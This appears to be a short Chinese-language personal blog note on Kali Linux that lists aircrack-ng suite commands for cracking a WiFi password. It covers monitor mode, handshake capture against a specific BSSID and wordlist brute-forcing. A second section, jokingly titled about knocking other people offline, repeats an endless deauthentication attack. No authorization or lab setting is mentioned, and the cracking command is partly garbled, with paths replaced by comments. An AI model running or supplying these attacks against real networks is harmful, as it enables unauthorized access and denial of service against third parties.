---
title: kali
date: 2026-05-23 12:00:00
tags: kali, 无线安全, WiFi, 渗透
---

# kali

## 破解wifi密码

iwconfig 看无线网卡名称状态

sudo airmon-ng start wlan0 启动监控模式

sudo airmon-ng check kill 终止与监控模式冲突进程

clear

sudo airmon-ng start wlan0 再次启动监控模式成功打开且无冲突

iwconfig 已经成功改为监控模式

clear

sudo -i升级到root权限

sudo airodump-ng wlan0 监控周围所有wifi


开新终端

找到目标记住mac地址和channel

sudo airodump-ng --bssid C2:DC:E0:54:27:51 --channel 3 --write capture wlan0（此时开始寻找四次握手的包）



开新终端

sudo aireplay-ng --deauth 0 -a C2:DC:E0:54:27:51 wlan0 -D

解除所有连接此wifi的连接（此时设备开始重连，四次握手）



回到前一个终端

sudo aircrack-ng -b sudo C2:DC:E0:54:27:51 -w <!-- memo: 这是字典的位置
 --> <!-- memo: 这个是抓到的四次握手包，一般是01，但是我抓了五次 -->

爆破成功会把密码显示出来
### 断别人网哈哈哈哈哈

root

每一次拔下又插上无线网卡**都要重新切换成监听模式**

iwconfig 看无线网卡名称状态

sudo airmon-ng start wlan0 启动监控模式

sudo airmon-ng check kill 终止与监控模式冲突进程

clear

sudo airmon-ng start wlan0 再次启动监控模式成功打开且无冲突

iwconfig 已经成功改为监控模式

clear

sudo airodump-ng wlan0监控周围所有wifi

sudo aireplay-ng --deauth 0 -a C2:DC:E0:54:27:51 wlan0 -D



wpa3断不了